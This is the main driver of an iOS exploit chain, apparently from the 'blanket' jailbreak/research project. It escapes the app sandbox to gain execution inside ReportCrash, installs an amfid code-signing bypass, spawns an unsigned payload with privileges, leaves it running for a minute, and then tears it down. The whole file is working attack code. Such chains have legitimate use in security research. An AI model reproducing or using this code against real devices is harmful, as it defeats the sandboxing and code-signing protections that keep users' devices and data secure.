#include "blanket/main/blanket_main.h"

#include "blanket/amfid/amfid_codesign_bypass.h"
#include "blanket/log/log.h"
#include "blanket/sandbox_escape/sandbox_escape.h"
#include "blanket/sandbox_escape/spawn_privileged.h"

#include <notify.h>
#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>

#define PAYLOAD_NAME	"blanket_payload"

// Copy the path to the current bundle into a buffer.
static void
get_bundle_path(char *buffer, size_t size) {
	CFBundleRef bundle = CFBundleGetMainBundle();
	CFURLRef url = CFBundleCopyBundleURL(bundle);
	CFURLGetFileSystemRepresentation(url, true, (UInt8 *)buffer, size);
	CFRelease(url);
}

// Spawn the blanket payload.
static pid_t
spawn_payload(threadexec_t priv_tx) {
	pid_t pid = -1;
	// Get the path to the bundle directory.
	char bundle_path[1024];
	get_bundle_path(bundle_path, sizeof(bundle_path));
	// Build the path to the payload.
	char path[1024];
	snprintf(path, sizeof(path), "%s/%s", bundle_path, PAYLOAD_NAME);
	// Build the path to the iosbinpack64 directory. This will be the payload's working
	// directory.
	char binpack_dir[1024];
	snprintf(binpack_dir, sizeof(binpack_dir), "%s/%s", bundle_path, "iosbinpack64");
	// Install the amfid codesigning bypass.
	bool ok = amfid_codesign_bypass_install(priv_tx);
	if (!ok) {
		goto fail_0;
	}
	// Spawn the payload.
	const char *argv[] = { path, binpack_dir, NULL };
	int stdio_fds[3] = { -1, STDOUT_FILENO, STDERR_FILENO };
	pid = spawn_privileged(priv_tx, path, argv, NULL, stdio_fds);
	if (pid < 0) {
		goto fail_1;
	}
	// Success! Give the payload a few seconds before we remove the codesigning bypass to
	// launch amfidupe.
	sleep(4);
fail_1:
	amfid_codesign_bypass_remove();
fail_0:
	return pid;
}

// Stop the blanket payload by sending it a signal.
static void
stop_payload(threadexec_t priv_tx, pid_t payload_pid) {
	DEBUG_TRACE(1, "Stopping the payload");
	int err;
	bool ok = threadexec_call_cv(priv_tx, &err, sizeof(err),
			kill, 2,
			TX_CARG_LITERAL(pid_t, payload_pid),
			TX_CARG_LITERAL(int, SIGHUP));
	if (!ok || err != 0) {
		WARNING("Could not stop payload");
	}
}

void
blanket_main() {
	DEBUG_TRACE(1, "%s", __func__);
	// Get an execution context in ReportCrash.
	threadexec_t reportcrash_tx = sandbox_escape();
	if (reportcrash_tx == NULL) {
		goto fail_0;
	}
	// Use ReportCrash to spawn our payload.
	pid_t payload_pid = spawn_payload(reportcrash_tx);
	if (payload_pid < 0) {
		goto fail_1;
	}
	DEBUG_TRACE(1, "Payload PID: %d", payload_pid);
	// Give the user 1 minute to connect.
	INFO("Waiting for 1 minute...");
	sleep(60);
	stop_payload(reportcrash_tx, payload_pid);
	// Give the payload and amfidupe time to exit.
	sleep(5);
fail_1:
	threadexec_deinit(reportcrash_tx);
fail_0:
	DEBUG_TRACE(1, "%s: done", __func__);
	exit(1);
}
